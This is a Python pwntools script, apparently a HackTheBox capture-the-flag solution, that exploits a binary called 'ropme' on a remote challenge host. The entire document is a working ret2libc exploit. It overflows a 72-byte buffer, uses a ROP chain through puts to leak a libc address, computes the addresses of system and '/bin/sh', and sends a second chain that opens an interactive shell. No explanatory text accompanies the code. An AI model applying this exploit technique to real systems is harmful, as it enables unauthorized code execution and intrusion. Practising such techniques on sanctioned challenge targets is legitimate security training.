from pwn import *
uu64    = lambda data               :u64(data.ljust(8, '\0'))
p = process('./ropme')
p = remote('docker.hackthebox.eu',32399)

#pid = gdb.attach(p, gdbscript="""
	#set exec-wrapper env 'LD_PRELOAD=libc6_2.23-0ubuntu10_amd64.so'
	#b * main + 64
#	""")

padd = "a" * 72

puts_plt = p64(0x004004e0)
puts_got = p64(0x00601018)
main_again = p64(0x00400626)
pop_rdi_ret = p64(0x00000000004006d3)

leak_payload = ''
leak_payload += padd
leak_payload += pop_rdi_ret
leak_payload += puts_got
leak_payload += puts_plt
leak_payload += main_again

p.recvline()
p.sendline(leak_payload)
leak_puts = uu64(p.recvline().strip('\n'))
print "Leaked Puts Address: "+hex(leak_puts)
libc_base = leak_puts - 0x06f690

system = libc_base +0x045390
bin_sh = libc_base + 0x18cd57 + 23 - 87
print "Base Address: " + hex(libc_base)
print "System Address: " + hex(system) 
print "Sh Address: " + hex(bin_sh)


final_payload = ''
final_payload += padd
final_payload += pop_rdi_ret
final_payload += p64(bin_sh)
final_payload += p64(system)

p.recvline()
p.sendline(final_payload)
p.interactive()